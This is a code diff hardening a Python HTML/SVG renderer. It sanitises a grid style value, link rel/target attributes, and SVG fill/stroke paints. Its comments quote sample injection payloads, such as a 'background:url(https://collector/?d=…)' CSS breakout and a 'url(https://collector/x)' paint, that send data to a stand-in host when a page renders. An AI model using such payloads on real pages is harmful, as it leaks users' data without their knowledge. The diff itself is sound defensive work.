@@ -61,6 +61,11 @@ from .egress import (
     sanitize_url_for_egress,
 )
 from .html import element, escape_text, text_element, void_element
+from .sanitize import (
+    sanitize_css_value_for_slot,
+    sanitize_link_anchor,
+    sanitize_paint_value,
+)
 from .seeds import with_state_seeds
 from .theme import node_class_name, trend_sentiment
 
@@ -522,6 +527,16 @@ class Renderer:
                 cols = lf.get("cols")
                 cols = cols if isinstance(cols, int) else 1
                 template = f"repeat({cols}, 1fr)"
+            # `templateColumns` is a free string on the wire that lands verbatim
+            # in a `style` attribute — the one slot in this renderer where a
+            # decoded document writes CSS. Unsanitised, a value carrying
+            # `;background:url(https://collector/?d=…)` closed the declaration,
+            # opened a second one, and fetched on RENDER with no user act,
+            # outside the egress policy that governs every href and src in the
+            # same document; the React client dropped the identical value
+            # silently. The rule is the shared emission grammar, so every host
+            # now emits the same bytes for the same tree.
+            template, css_refusal_attrs = sanitize_css_value_for_slot("grid-template-columns", template)
             # `gap` (Phase 459) emits only when set — a gap-free grid stays
             # byte-identical to the pre-459 emission (mirrors F# Render.fs).
             style = f"grid-template-columns:{template}"
@@ -530,7 +545,7 @@ class Renderer:
                 style = f"{style};gap:{gap}px"
             return element(
                 "div",
-                [("class", "fuaran-layout-grid"), ("style", style)],
+                [("class", "fuaran-layout-grid"), ("style", style)] + css_refusal_attrs,
                 self._children_html(fields),
             )
         if role == "Group" and layout_mode == "Masonry":
@@ -958,12 +973,23 @@ class Renderer:
             self.egress_policy, EgressClass.HYPERLINK, href_value if isinstance(href_value, str) else ""
         )
         attrs: list[tuple[str, str]] = [("class", "fuaran-link"), ("href", href)]
-        rel = fields.get("rel")
-        if isinstance(rel, str):
-            attrs.append(("rel", rel))
-        target = fields.get("target")
-        if isinstance(target, str):
-            attrs.append(("target", target))
+        # `rel` and `target` were emitted VERBATIM, so a decoded tree could write
+        # `rel="opener"` on a `_blank` link and re-enable `window.opener`, or
+        # name an arbitrary browsing context in `target`. Both are closed token
+        # sets now, resolved TOGETHER because the `rel` rule depends on the
+        # sanitised target: `noopener noreferrer` is FORCED on `_blank` whether
+        # or not the document asked. Same grammar, same order, same bytes as
+        # every other host.
+        rel_value = fields.get("rel")
+        target_value = fields.get("target")
+        safe_target, safe_rel = sanitize_link_anchor(
+            target_value if isinstance(target_value, str) else None,
+            rel_value if isinstance(rel_value, str) else None,
+        )
+        if safe_rel is not None:
+            attrs.append(("rel", safe_rel))
+        if safe_target is not None:
+            attrs.append(("target", safe_target))
         if fields.get("download") is True:
             attrs.append(("download", ""))
         # The node's a11y projection lands on the anchor.
@@ -1559,7 +1585,15 @@ class Renderer:
         elif default_fill_none:
             fill = "none"
         if fill is not None:
-            out += f' fill="{_draw_escape(str(fill))}"'
+            # A paint is a CLOSED colour grammar, not a free string. `_draw_escape`
+            # makes a value safe as MARKUP and says nothing about what it MEANS,
+            # and `url(https://collector/x)` in an SVG `fill` names a paint server
+            # the user agent FETCHES — on render, with no user act, outside the
+            # egress policy. It also contains no character the generic CSS rule
+            # forbids, which is why these two slots need a positive grammar. A
+            # refused paint emits `none` rather than empty: an empty `fill`
+            # INHERITS the enclosing group's paint instead of clearing it.
+            out += f' fill="{_draw_escape(sanitize_paint_value(str(fill)))}"'
         if "opacity" in fields:
             v = resolve_binding(fields["opacity"], self.sources)
             if v is not None:
@@ -1567,7 +1601,7 @@ class Renderer:
         if "stroke" in fields:
             v = resolve_binding(fields["stroke"], self.sources)
             if v is not None:
-                out += f' stroke="{_draw_escape(str(v))}"'
+                out += f' stroke="{_draw_escape(sanitize_paint_value(str(v)))}"'
         if "strokeWidth" in fields:
             v = resolve_binding(fields["strokeWidth"], self.sources)
             if v is not None:
